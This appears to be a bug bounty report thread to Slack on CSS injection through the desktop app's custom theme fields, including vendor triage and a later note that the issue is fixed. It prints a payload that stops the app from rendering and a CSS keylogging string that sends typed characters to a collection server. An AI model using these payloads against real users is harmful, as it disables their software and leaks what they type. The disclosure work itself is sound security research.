title: CSS Injection to disable app & potential message exfil

profile.name: Slack
profile.about: All your team communication in one place, instantly searchable, and available wherever you go.

vulnerability_information:
Tested on Slack for MacOS v4.0.2 - I've marked this as code injection since there was no "css injection"

1. In the app go to Preferences -> Sidebar
2. Enable custom theming 
3. Set the column BG to `#FFFFFF;} html {display:none;}`
4. The app will no-longer render (this survives re-installs)

If this theme were to be shared to someone unsuspecting they would be unable to use slack, even surviving a reinstall (on mac, untested on other platforms).

Furthermore it _might_ be possible to exfil message data using CSS only. As seen here it is _possible_ to keylog via CSS only https://github.com/maxchehab/CSS-Keylogging/ however I have not been able to come up with a proper PoC of this.

I've marked this as low for now as I don't have a PoC exiling data however I have shown that it is possible to inject to completely disable the app.

## Impact

The app is no longer able to render - there might be the possibility of data exfil but I didn't get a PoC working.
vulnerability_information_html:
Tested on Slack for MacOS v4.0.2 - I've marked this as code injection since there was no "css injection"

  1. In the app go to Preferences -> Sidebar
  2. Enable custom theming
  3. Set the column BG to #FFFFFF;} html {display:none;}
  4. The app will no-longer render (this survives re-installs)

If this theme were to be shared to someone unsuspecting they would be unable to use slack, even surviving a reinstall (on mac, untested on other platforms).

Furthermore it might be possible to exfil message data using CSS only. As seen here it is possible to keylog via CSS only https://github.com/maxchehab/CSS-Keylogging/ however I have not been able to come up with a proper PoC of this.

I've marked this as low for now as I don't have a PoC exiling data however I have shown that it is possible to inject to completely disable the app.

Impact

The app is no longer able to render - there might be the possibility of data exfil but I didn't get a PoC working.

activities.markdown_message:
To further add it might be possible to get a keylogger working to log messages via something like:

input[type="text"][value$="a"] {
  background-image: url("http://localhost:3000/a");
}

Repeating for a->z A->Z and 1-9... This could likely be saved in a CSS file somewhere and then imported using @import <said css file> I haven't managed to get a PoC working for that yet.

In the meantime if you'd like to use slack with comic sans feel free to use: ;}*{FONT-FAMILY:"COMIC SANS MS"!IMPORTANT;}STYLE~DIV,DIV[TABINDEX="-1"]

  • fletchto99

activities.message: I managed to get keylogging working to some extent, recording a PoC video now. How can I increase the severity?
activities.markdown_message: I managed to get keylogging working to some extent, recording a PoC video now. How can I increase the severity?

activities.message:
Using the custom theme: `#FFFFFF;}INPUT[TYPE="TEXT"][VALUE$="A"] {   BACKGROUND-IMAGE: URL("HTTP://LOCALHOST:3000/A"); },#350d36,#1264A3,#FFFFFF,#350D36,#FFFFFF,#2BAC76,#CD2553`

I was able to keylog the letter "A". Of course this can be extended to all other characters as well.

Attached is a PoC video
activities.markdown_message:
Using the custom theme: #FFFFFF;}INPUT[TYPE="TEXT"][VALUE$="A"] { BACKGROUND-IMAGE: URL("HTTP://LOCALHOST:3000/A"); },#350d36,#1264A3,#FFFFFF,#350D36,#FFFFFF,#2BAC76,#CD2553

I was able to keylog the letter "A". Of course this can be extended to all other characters as well.

Attached is a PoC video

activities.message:
Thank you for your report.

We were able to reproduce the behavior you are reporting here, but we would like some clarification on the severity of this issue.  While a list of the hexadecimal color codes of the entire theme may be shared at once, via the "Copy" button in the "Custom theme" section, it appears that in order to apply the custom theme, users must manually enter the hexadecimal color code for **every** field, such as "Column BG", individually. Can you confirm if this is the case? That is, is there a way to leverage this behavior against other users, **without** requiring the victim to paste the payload into one of their "Custom theme" inputs?

Thanks, and good luck with your future bug hunting.
activities.markdown_message:
Thank you for your report.

We were able to reproduce the behavior you are reporting here, but we would like some clarification on the severity of this issue. While a list of the hexadecimal color codes of the entire theme may be shared at once, via the "Copy" button in the "Custom theme" section, it appears that in order to apply the custom theme, users must manually enter the hexadecimal color code for every field, such as "Column BG", individually. Can you confirm if this is the case? That is, is there a way to leverage this behavior against other users, without requiring the victim to paste the payload into one of their "Custom theme" inputs?

Thanks, and good luck with your future bug hunting.

activities.message:
Hey Ryan,

Sorry for the few scattered posts initially, I didn't expect to get that far. Anyhow I played around with the theme sharing feature (a single click button to apply a theme) and it didn't seem to work. It seems the only way to affect the user is if they paste the values into one of the custom theme fields. It appears even pasting into the box below the individual fields doesn't work. I've posted a screenshot of what I had attempted without success.

One thing I should mention that this does persist across all slack app for that user of that workspace, so if the user apply the keylogger on their windows slack app it will also work in the web and on mac (as far as I can tell).

I'd be happy to dig into it further this weekend provided it's not already patched - unfortunately I don't have much more time today. Just let me know.

activities.message:
Hey Josh,

It looks like the core issue is resolved. If I put the injection strings in (I've tried a few different combos) they all just reset the theme to the default colors. Though it does seem odd that I'm able to enter things other than hex colors and more than 6 characters. I couldn't get a CSS injection working though.

Thanks,
Matt

Thanks again.
